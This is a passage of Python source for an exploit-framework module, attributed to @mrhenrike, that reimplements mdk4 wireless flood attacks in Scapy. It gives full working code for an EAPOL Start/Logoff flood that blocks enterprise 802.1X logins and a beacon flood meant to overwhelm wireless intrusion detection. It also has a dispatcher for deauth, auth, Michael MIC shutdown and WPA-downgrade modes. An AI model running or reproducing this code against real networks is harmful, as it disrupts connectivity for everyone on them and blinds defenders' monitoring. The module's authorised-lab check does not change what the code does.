def _run_eapol_flood(
    interface: str,
    bssid: str,
    count: int,
    delay: float,
    verbose: bool,
) -> int:
    """Saturate AP EAP state machine with EAPOL-Start and EAPOL-Logoff frames.

    Alternates between EAPOL-Start (type=1) and EAPOL-Logoff (type=2) frames
    with spoofed source MACs to exhaust enterprise AP EAP handler threads and
    prevent legitimate 802.1X authentications.

    Args:
        interface: Monitor-mode interface.
        bssid: Target AP BSSID (or broadcast if not set).
        count: Maximum frames (0 = infinite).
        delay: Inter-frame delay in seconds.
        verbose: Emit progress logs every 100 frames when True.

    Returns:
        Total frames injected.
    """
    from scapy.all import LLC, SNAP, Dot11, RadioTap, Raw, sendp

    dst = bssid.lower() if bssid else "ff:ff:ff:ff:ff:ff"
    sent = 0
    limit = count if count > 0 else 10 ** 9

    eapol_start = struct.pack(">BBH", 2, 1, 0)   # version=2, type=Start, len=0
    eapol_logoff = struct.pack(">BBH", 2, 2, 0)  # version=2, type=Logoff, len=0

    try:
        for i in range(limit):
            src = _random_mac()
            payload = eapol_start if i % 2 == 0 else eapol_logoff

            pkt = (
                RadioTap() /
                Dot11(type=2, subtype=8,
                      FCfield="to-DS",
                      addr1=dst,
                      addr2=src,
                      addr3=dst) /
                LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
                SNAP(OUI=0x000000, code=0x888E) /
                Raw(load=payload)
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose and sent % 100 == 0:
                print_status(f"EAPOL flood: {sent} frames sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Mode w -- WIDS confusion                                                   #
# --------------------------------------------------------------------------- #

def _run_wids_confusion(
    interface: str,
    count: int,
    delay: float,
    verbose: bool,
) -> int:
    """Overwhelm WIDS log pipelines via rapid MAC/SSID/channel alternation.

    Injects beacon frames with continuously changing BSSIDs, SSIDs, and
    channels, generating a volume of synthetic AP events that saturates
    Wireless Intrusion Detection System correlation engines and alerting
    queues.

    Args:
        interface: Monitor-mode interface.
        count: Maximum frames (0 = infinite).
        delay: Inter-frame delay in seconds.
        verbose: Emit progress logs every 100 frames when True.

    Returns:
        Total frames injected.
    """
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

    channels = list(range(1, 14))
    sent = 0
    limit = count if count > 0 else 10 ** 9

    try:
        for i in range(limit):
            ssid = _random_ssid()
            bssid = _random_mac()
            ch = channels[i % len(channels)]
            enc_ssid = ssid.encode("utf-8", errors="replace")

            if i % 20 == 0:
                _set_channel(interface, ch)

            pkt = (
                RadioTap() /
                Dot11(type=0, subtype=8,
                      addr1="ff:ff:ff:ff:ff:ff",
                      addr2=bssid, addr3=bssid) /
                Dot11Beacon(cap="ESS+privacy") /
                Dot11Elt(ID="SSID", info=enc_ssid, len=len(enc_ssid)) /
                Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
                Dot11Elt(ID="DSset", info=bytes([ch]))
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose and sent % 100 == 0:
                print_status(f"WIDS confusion: {sent} frames sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Exploit class                                                              #
# --------------------------------------------------------------------------- #

@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """Native 802.11 flood/DoS engine -- all mdk4 modes in Python/Scapy.

    Replaces external mdk3/mdk4 binary calls with direct frame construction
    and injection via Scapy. Requires a monitor-mode interface with frame
    injection capability (Linux only).
    """

    __info__ = {
        "name": "Native Flood Engine (mdk4-compatible)",
        "description": (
            "Implements all mdk4 attack modes natively via Scapy: beacon flood (b), "
            "auth flood (a), deauth/disassoc flood (d), probe request flood (p), "
            "Michael MIC shutdown (m), WPA downgrade via RSN IE (g), "
            "EAPOL Start/Logoff flood (e), and WIDS confusion (w). "
            "No external mdk3/mdk4 binary required."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/vanhoef/mdk4",
            "https://doi.org/10.1109/SP.2004.30",
            "https://www.rfc-editor.org/rfc/rfc3748",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Monitor-mode interface (Linux only)")
    bssid = OptMAC("", "Target AP BSSID (required for modes a, d, g, m)")
    mode = OptString(
        "d",
        "Attack mode: b (beacon) | a (auth) | d (deauth) | p (probe) | "
        "m (michael-mic) | g (wpa-downgrade) | e (eapol) | w (wids)",
    )
    client = OptMAC("FF:FF:FF:FF:FF:FF", "Target client MAC for mode d (broadcast = all)")
    ssids = OptString(
        "",
        "Comma-separated SSID list for modes b and p (blank = random per frame)",
    )
    channel = OptInteger(0, "Fixed channel for injection (0 = auto-hop where supported)")
    count = OptInteger(0, "Maximum frames to inject (0 = continuous until Ctrl-C)")
    delay = OptFloat(0.0, "Inter-frame delay in seconds (0.0 = maximum rate)")
    reason = OptInteger(7, "IEEE 802.11 deauth reason code (mode d only)")
    verbose = OptBool(False, "Emit per-frame progress logs")
    dry_run = OptBool(False, "Print configuration without injecting any frames")

    _VALID_MODES: frozenset = frozenset({"b", "a", "d", "p", "m", "g", "e", "w"})

    def _parse_ssids(self) -> list[str]:
        """Parse the comma-separated ssids option into a list.

        Returns:
            List of trimmed, non-empty SSID strings; empty list if not set.
        """
        raw = getattr(self, "ssids", "") or ""
        return [s.strip() for s in raw.split(",") if s.strip()]

    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready.

        Returns:
            Human-readable status string suitable for display in the console.
        """
        import shutil as _shutil
        import subprocess as _subprocess

        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if _shutil.which("iwconfig"):
            try:
                out = _subprocess.check_output(
                    ["iwconfig", str(iface)],
                    stderr=_subprocess.STDOUT,
                    timeout=5,
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return (
                        f"Interface {iface} found but NOT in Monitor mode - "
                        f"run airmon-ng start {iface}"
                    )
            except (_subprocess.CalledProcessError, FileNotFoundError, _subprocess.TimeoutExpired):
                pass
        if _shutil.which("iw"):
            try:
                out = _subprocess.check_output(
                    ["iw", "dev"], stderr=_subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return (
            f"Interface {iface} not found - "
            f"connect wireless adapter and enable monitor mode"
        )

    def run(self) -> None:
        """Dispatch to the selected attack mode and report results."""
        if self.mode not in self._VALID_MODES:
            print_error(
                "Invalid mode '{}'. Valid modes: {}".format(
                    self.mode, " | ".join(sorted(self._VALID_MODES))
                )
            )
            return

        require_authorised_lab()

        if self.mode == "d":
            warn_pmf_ios()

        if self.dry_run:
            print_info(
                "DRY RUN - mode={} iface={} bssid={} client={} count={} delay={}s".format(
                    self.mode, self.interface, self.bssid or "(any)",
                    self.client, self.count, self.delay,
                )
            )
            return

        ssid_list = self._parse_ssids()
        ch = self.channel if self.channel > 0 else None

        print_status(
            "Starting flood mode '{}' on {} (count={}, delay={}s)".format(
                self.mode, self.interface, self.count or "inf", self.delay,
            )
        )

        sent = 0

        if self.mode == "b":
            sent = _run_beacon_flood(
                self.interface, ssid_list, ch,
                self.count, self.delay, self.verbose,
            )

        elif self.mode == "a":
            if not self.bssid:
                print_error("Mode 'a' requires bssid to be set.")
                return
            sent = _run_auth_flood(
                self.interface, self.bssid,
                self.count, self.delay, self.verbose,
            )

        elif self.mode == "d":
            if not self.bssid:
                print_error("Mode 'd' requires bssid to be set.")
                return
            sent = _run_deauth_flood(
                self.interface, self.bssid, self.client,
                self.count, self.delay, self.reason, self.verbose,
            )

        elif self.mode == "p":
            sent = _run_probe_flood(
                self.interface, ssid_list,
                self.count, self.delay, self.verbose,
            )

        elif self.mode == "m":
            if not self.bssid:
                print_error("Mode 'm' requires bssid to be set.")
                return
            sent = _run_michael_shutdown(
                self.interface, self.bssid, self.client,
                self.count, self.delay, self.verbose,
            )

        elif self.mode == "g":
            if not self.bssid:
                print_error("Mode 'g' requires bssid to be set.")
                return
            sent = _run_wpa_downgrade(
                self.interface, self.bssid,
                self.count, self.delay, self.verbose,
            )

        elif self.mode == "e":
            sent = _run_eapol_flood(
                self.interface, self.bssid,
                self.count, self.delay, self.verbose,
            )

        elif self.mode == "w":
            sent = _run_wids_confusion(
                self.interface,
                self.count, self.delay, self.verbose,
            )

        print_success(
            f"Flood mode '{self.mode}' complete: {sent} frames injected."
        )
